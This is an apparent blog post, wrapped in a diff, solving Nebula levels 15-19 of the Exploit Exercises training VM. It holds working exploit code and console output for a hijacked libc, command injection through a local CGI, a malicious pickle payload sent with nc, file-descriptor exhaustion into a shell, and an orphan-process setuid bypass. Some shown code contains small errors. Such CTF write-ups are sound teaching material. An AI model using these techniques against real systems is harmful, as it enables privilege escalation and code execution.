@@ -1,0 +1,518 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Nebula Shell Exploits (Solutions 15-19) - Louis Li</title>
+	<meta name="author" content="Louis Li">
+
+	
+	<meta name="description" content="Nebula Shell Exploits (Solutions 15-19) Overview This is third and final post of my solutions for Exploit Exercises. This comes about a month after &hellip;">
+	
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<link href="http://feeds.feedburner.com/louisligithub" rel="alternate" title="Louis Li" type="application/atom+xml">
+	
+	<link rel="canonical" href="http://louisrli.github.io/blog/2012/08/17/nebula2/">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	<link href='http://fonts.googleapis.com/css?family=Open+Sans:400italic,400,700' rel='stylesheet' type='text/css'>
+	<!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+</head>
+
+
+<body>
+	<div class="container">
+		<div class="left-col">
+			<div class="intrude-less">
+			<header id="header" class="inner"><div class="profilepic">
+	<script src="/javascripts/md5.js"></script>
+	<script type="text/javascript">
+		$(function(){
+			$('.profilepic').append("<img src='http://www.gravatar.com/avatar/" + MD5("louisrli@gmail.com") + "?s=160' alt='Profile Picture' style='width: 160px;' />");
+		});
+	</script>
+</div>
+<hgroup>
+  <h1><a href="/">Louis Li</a></h1>
+  
+</hgroup>
+
+<p class="subtitle"></p>
+<nav id="main-nav"><ul class="main-navigation">
+  <li><a href="/blog">Blog</a></li>
+  <li><a href="/blog/2013/01/12/sideprojects-2012/">Sideprojects</a></li>
+  <li><a href="http://github.com/louisrli">Github</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+<nav id="sub-nav">
+	<div class="social">
+		
+		
+		<a class="google" href="https://plus.google.com/106125247318074050350" rel="author" title="Google+">Google+</a>
+		
+		
+		
+		<a class="github" href="https://github.com/louisrli" title="GitHub">GitHub</a>
+		
+		
+		
+		
+		
+		
+		
+		
+		<a class="rss" href="http://feeds.feedburner.com/louisligithub" title="RSS">RSS</a>
+		
+	</div>
+</nav>
+</header>				
+			</div>
+		</div>	
+		<div class="mid-col">
+			
+				
+			
+			<div class="mid-col-container">
+				<div id="content" class="inner"><article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+	<h1 class="title" itemprop="name">Nebula Shell Exploits (Solutions 15-19)</h1>
+	<div class="entry-content" itemprop="articleBody"><h1>Overview</h1>
+
+<p>This is third and final post of my solutions for <a href="http://exploit-exercises.com/nebula">Exploit Exercises</a>. This comes about a month after finishing 10-14 &mdash; I was distracted by some other projects.</p>
+
+<h2>Level 15</h2>
+
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level15">(full)</a>: <code>strace</code> on the binary reveals that it searches for libraries based on <a href="http://saintaardvarkthecarpeted.com/blog/archive/2005/08/_etc_ld_so_nohwcap.html">hardware capabilities</a>.</p>
+
+<div>
+  <pre><code class='console'>$ strace /home/flag15/flag15 2&gt;&amp;1 | less
+...
+stat64(&quot;/var/tmp/flag15/tls/i686/sse2/cmov&quot;, 0xbfc25f24) = -1 ENOENT (No such file or directory)
+open(&quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64(&quot;/var/tmp/flag15/tls/i686/sse2&quot;, 0xbfc25f24) = -1 ENOENT (No such file or directory)
+open(&quot;/var/tmp/flag15/tls/i686/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64(&quot;/var/tmp/flag15/tls/i686/cmov&quot;, 0xbfc25f24) = -1 ENOENT (No such file or directory)
+open(&quot;/var/tmp/flag15/tls/i686/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)such file or directory)
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb78cd000
+access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
+open(&quot;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64(&quot;/var/tmp/flag15/tls/i686/sse2/cmov&quot;, 0xbfc25f24) = -1 ENOENT (No such file or directory)
+...</code></pre>
+</div>
+
+
+<p>We want to either substitute our own version of libc, overriding the <code>puts()</code> call in <code>flag15</code>, or we want to execute code in the process. While the hard part isn&rsquo;t creating our own shared library, we have to figure out how to prevent <code>libc</code> from being linked into our library. This solution executes code in the makeshift <code>libc.so</code>.</p>
+
+<!-- more -->
+
+
+<div>
+  <pre><code class='bash'>#!/bin/bash
+# /home/level15/flag.sh
+getflag &gt; /home/flag15/getflag.log</code></pre>
+</div>
+
+
+
+
+<br />
+
+
+<p><code>~/version</code>: preventing an error about requiring <code>GLIBC_2.0</code>:</p>
+
+<div>
+  <pre><code class='text'>GLIBC_2.0 { };</code></pre>
+</div>
+
+
+
+
+<br />
+
+
+<p><code>~/run.sh</code>: A makeshift Makefile that also executes our code.</p>
+
+<div>
+  <pre><code class='bash'>#!/bin/bash -ex
+# run.sh
+gcc -fPIC -g -c -Wall getflag.c
+gcc -shared -Wl,-Bstatic,-soname,libc.so.6,--version-script,version -o libc.so.6 getflag.o  -L/usr/lib/i386-linux-gnu -static-libgcc
+mv /home/level15/libc.so.6 /var/tmp/flag15/
+/home/flag15/flag15
+cat /home/flag15/getflag.log</code></pre>
+</div>
+
+
+<p> <br/>
+<code>~/getflag.c</code>: another interpretation of &ldquo;libc,&rdquo; but it happens to call <code>execv</code>.</p>
+
+<div>
+  <pre><code class='cpp'>#include &lt;stdio.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;unistd.h&gt;
+
+// If this isn't here, we have an error about a missing symbol
+void __cxa_finalize(void *d) {
+    return;
+}
+
+// http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html
+int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
+    char *args_new[] = { &quot;/bin/sh&quot;, &quot;/home/level15/flag.sh&quot; };
+    execve(&quot;/bin/sh&quot;, args_new);
+    return 0;
+}</code></pre>
+</div>
+
+
+
+
+<div>
+  <pre><code class='console'>$ ./run.sh
+You have successfully executed getflag on a target account</code></pre>
+</div>
+
+
+<h2>Level 16</h2>
+
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level16">(full)</a>: A Perl script running on port 1616 runs <code>egrep</code> with user input. It has some red herrings about a username and a password, but the goal is to execute arbitrary code.</p>
+
+<p>This solution uses <a href="http://hakipedia.com/index.php/Poison_Null_Byte">null byte injection</a> to execute arbitrary commands on the target account.</p>
+
+<p>There are two parts to the solution:</p>
+
+<ol>
+<li>The Perl script converts all input to uppercase. We work around this by using a wildcard match, searching for <code>/tmp/RUN/</code> (our script) as <code>/*/RUN</code>.</li>
+<li>The Perl string doesn&rsquo;t immediately allow us to execute arbitrary code. We have to terminate the string correctly with the right combination of <code>"</code>, &ldquo;<code>\``", and</code>%00`. The last one is the null character in a URL.</li>
+</ol>
+
+
+<div>
+  <pre><code class='bash'>#!/bin/bash
+# /home/level16/curl
+echo $1  # sanity check
+url=&quot;http://localhost:1616/index.cgi?username=$1&amp;password=foo&quot;
+echo $uri
+curl --globoff $3 &quot;$uri&quot;
+ls /home/flag16 | grep getflag.log</code></pre>
+</div>
+
+
+
+
+<div>
+  <pre><code class='bash'>#!/bin/bash
+# /tmp/RUN
+getflag &gt; /home/flag16/getflag.log</code></pre>
+</div>
+
+
+
+
+<div>
+  <pre><code class='console'>$ ~/curl ' &quot;`/*/RUN` %00 '
+$ cat /home/flag16/getflag.log
+You have successfully executed getflag on a target account</code></pre>
+</div>
+
+
+<h2>Level 17</h2>
+
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level17">(full)</a>: A Python script running on port 10007 loads pickled data from input.</p>
+
+<p>The vulnerability of the Python <code>pickle</code> module is <a href="https://www.google.com/search?q=pickle+vulnerability">well-documented</a>. The Python docs say:</p>
+
+<blockquote><p>Warning: The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source</p></blockquote>
+
+<p><a href="http://nadiana.com/python-pickle-insecure">This article</a> gives us an example of malicious Pickle data.</p>
+
+<p>Our pickled &ldquo;data&rdquo; goes in <code>~/cmd</code>:</p>
+
+<div>
+  <pre><code class='text'>cos
+system
+(S' /tmp/run17'
+tR.</code></pre>
+</div>
+
+
+<p>We send the pickled data to the listening script.</p>
+
+<div>
+  <pre><code class='console'>$ cat /tmp/run17
+#!/bin/bash
+getflag &gt; /home/flag17/getflag.log
+$ cat cmd | nc localhost 10007
+Accepted connection from 127.0.0.1:56228^C
+$ cat /home/flag17/getflag.log
+You have successfully executed getflag on a target account</code></pre>
+</div>
+
+
+<h3>Interpreting Pickled data</h3>
+
+<p>I was curious about the parts of the malicious pickle. I searched first for the <code>pickle</code> format specification, but I wasn&rsquo;t able to find it. I was a bit surprised that I was only able to find <a href="http://peadrop.com/blog/2007/06/18/pickle-an-interesting-stack-language/">one article</a> related to the semantics of the pickle format. Part of our input is explained:</p>
+
+<blockquote><p>The ‘(‘ is simply a marker. It is a object in the stack that tells the tuple builder, ‘t’, when to stop. The tuple builder pops items from the stack until it reaches a marker. Then, it creates a tuple with these items and pushes this tuple back on the stack. You can use multiple markers to construct a nested tuple&hellip;</p></blockquote>
+
+<h2>Level 18</h2>
+
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level18">(full)</a>: <code>flag18</code> is a program that mimics a login shell with various options such as <code>login</code>, <code>logout</code>, <code>shell</code> (see full description). The flag directory contains an unreadable password file.</p>
+
+<h3>Discussion</h3>
+
+<p>This problem was more complex than the others, given the number of options provided initially.</p>
+
+<p>There are flags on <code>flag19</code> for a debug file and a verbose level. Using <code>-d /dev/tty</code> saves us some effort.</p>
+
+<div>
+  <pre><code class='console'>$ /home/flag19/flag19 -d /dev/tty -vvvvv
+login
+got [login] as input
+attempting to login</code></pre>
+</div>
+
+
+<p>If we iterate through the possible commands, we can rule out some paths.</p>
+
+<ul>
+<li>There&rsquo;s no apparent path for dumping the contents of the password file through the code.</li>
+<li>The <code>notsupported()</code> and <code>setuser()</code> functions seem to deal with strings and buffers. These are potential solutions, but from a metagame perspective, Nebula solutions use shell exploits, not memory exploits.</li>
+</ul>
+
+
+<p>We can confirm this by trying playing around with buffer overflows and format strings:</p>
+
+<div>
+  <pre><code class='text'>site exec %s%s%s%s%s  # notsupported() -&gt; prints some of the stack
+site exec %n  # notsupported() -&gt; fails with *** %n in writable segment detected ***
+setuser AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  # setuser() -&gt; exits immediately, detecting buffer overflow</code></pre>
+</div>
+
+
+<h3>Solution</h3>
+
+<p><code>if(fp)</code> will fail if the file can&rsquo;t be opened for any reason. Since the files opened by <code>login</code> are never closed, we can open files until we reach the maximum number of file descriptors. <code>fp</code> will then be <code>NULL</code> once the maximum number is reached. Finally, we use <code>closelog</code> to free a file descriptor.</p>
+
+<p>If <code>closelog</code> isn&rsquo;t called, <code>execve("/bin/sh", ...)</code> will fail with an error loading a shared library <code>libncurses.so.5</code>.</p>
+
+<div>
+  <pre><code class='console'>$ for i in $(seq 1 2000); do echo &quot;login foo&quot; &gt;&gt; ~/flood; done
+$ echo &quot;closelog&quot; &gt;&gt; ~/flood
+$ echo &quot;shell&quot; &gt;&gt; ~/flood
+$ echo &quot;getflag &gt; /tmp/getflag.log&quot; &gt; /tmp/getflag &amp;&amp; chmod a+x /tmp/getflag</code></pre>
+</div>
+
+
+<p>The initial attempt looks like this:</p>
+
+<div>
+  <pre><code class='console'>$ cd /home/flag18/
+$ cat ~/flood | ./flag18 -d /dev/tty
+...
+/home/flag18/flag18: -d: invalid option</code></pre>
+</div>
+
+
+<p><code>sh</code> doesn&rsquo;t have a <code>-d</code> flag. The author left a hint to look at the options in the man page; <code>sh</code> needs an option that ignores the input afterwards.</p>
+
+<div>
+  <pre><code class='console'>$ cat ~/flood | ./flag18 --init-file /tmp/getflag -d /dev/tty</code></pre>
+</div>
+
+
+<p>This actually opens a promptless shell reading from stdin.</p>
+
+<div>
+  <pre><code class='console'>...
+logged in successfully (without password file)
+logged in successfully (without password file)
+logged in successfully (without password file)
+whoami
+flag18
+cat /home/flag18/password
+44226113-d394-4f46-9406-91888128e27a
+getflag
+You have successfully executed getflag on a target account</code></pre>
+</div>
+
+
+<p>The password doesn&rsquo;t seem to work for logging into the <code>flag18</code> account, but the shell can execute <code>getflag</code>.</p>
+
+<h2>Level 19</h2>
+
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level19">(full)</a>: The <code>flag19</code> executable checks if the root user started the process. If so, then it runs <code>execve</code> on <code>/bin/sh</code>.</p>
+
+<p><a href="http://cs61.seas.harvard.edu/cs61wiki/images/7/7b/Lec21-Processes.pdf">CS61 Lecture Notes (Processes)</a> was particularly valuable here. I won&rsquo;t end up taking the class, but I should show my appreciation for the lecture notes &mdash; they&rsquo;re all very well made.</p>
+
+<p>We want to start <code>flag19</code> in an <a href="http://en.wikipedia.org/wiki/Orphan_process">orphan process</a>. An orphan process is claimed by the program <code>init</code> (PID 1), which is owned by root (UID 0). The plan looks like:</p>
+
+<ol>
+<li>Use <code>fork()</code> to create a child process, exit the parent process, and <code>sleep()</code> to create an orphan.</li>
+<li>Execute <code>/home/flag19/flag19</code> with our arguments The <code>stat</code> should complete successfully, as we control the time of check.</li>
+</ol>
+
+
+<div>
+  <pre><code class='c'>// attempt.c
+
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+
+int main() {
+    if (fork() == 0) {
+        sleep(10);
+        printf(&quot;executing code in orphan…\n&quot;);
+        fflush(stdout);
+        char *flag19_args[] = { &quot;-c&quot; &quot;/home/level19/run19.sh&quot; };
+        execv(&quot;/home/flag19/flag19&quot;, flag19_args);
+        return;
+    }
+    else {
+        printf(&quot;returning from parent\n&quot;);
+        exit(0);
+    }
+    printf(&quot;sanity check, outside both - should never happen\n&quot;);
+}</code></pre>
+</div>
+
+
+
+
+<div>
+  <pre><code class='bash'>#!/bin/bash.sh
+# /home/level19/run19.sh
+# Standard getflag wrapper
+file=/home/flag19/getflag19.log
+getflag &gt; ${file}
+id &gt;&gt; ${file}</code></pre>
+</div>
+
+
+
+
+<div>
+  <pre><code class='console'>$ gcc -o attempt.c attempt
+$ ./attempt
+returning from parent
+$ executing code in orphan...
+$ cat /home/flag19/getflag19.log
+You have successfully executed getflag on a target account
+uid=1020(level19) ...</code></pre>
+</div>
+
+
+<h3>Tangent</h3>
+
+<p>I ran into an interesting issue caused by laziness (well, in reality, a desire for flexibility).</p>
+
+<p>The code below does <strong>not</strong> run <code>execve</code> as suid. It runs it as the user <code>level19</code> instead of <code>flag19</code>, which may have been caused by passing down <code>envp</code>.</p>
+
+<div>
+  <pre><code class='c'>int main(int argc, char **argv, char **envp) {
+    if (fork () == 0) {
+        // our other code…
+        execve(&quot;/home/flag19/flag19&quot;, argv, envp);
+    }
+}</code></pre>
+</div>
+
+
+<p>This meant that I could conveniently pass arguments through the executable:</p>
+
+<div>
+  <pre><code class='text'>gcc attempt.c -o attempt
+./attempt &quot;/home/level19/run19.sh&quot;</code></pre>
+</div>
+
+
+<p>Unfortunately, it also meant that <code>getflag</code> wouldn&rsquo;t execute on the correct user.</p>
+</div>
+
+</article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	<a class="addthis_button_tweet"></a>
+	
+	
+	<a class="addthis_counter addthis_pill_style"></a>
+	</div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
+
+
+
+<section id="comment">
+    <h1 class="title">Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
+</div>
+			</div>
+			<footer id="footer" class="inner"><p>
+  Copyright &copy; 2013 - Louis Li -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+Design credit: <a href="http://shashankmehta.in/archive/2012/greyshade.html">Shashank Mehta</a></footer>
+			<script src="/javascripts/slash.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+<script type="text/javascript">
+      var disqus_shortname = 'louisrli';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://louisrli.github.io/blog/2012/08/17/nebula2/';
+        var disqus_url = 'http://louisrli.github.io/blog/2012/08/17/nebula2/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+	<script type="text/javascript">
+		var _gaq = _gaq || [];
+		_gaq.push(['_setAccount', 'UA-32823730-1']);
+		_gaq.push(['_trackPageview']);
+
+		(function() {
+			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		})();
+	</script>
+
+
+
+
+		</div>
+	</div>
+</body>
+</html>
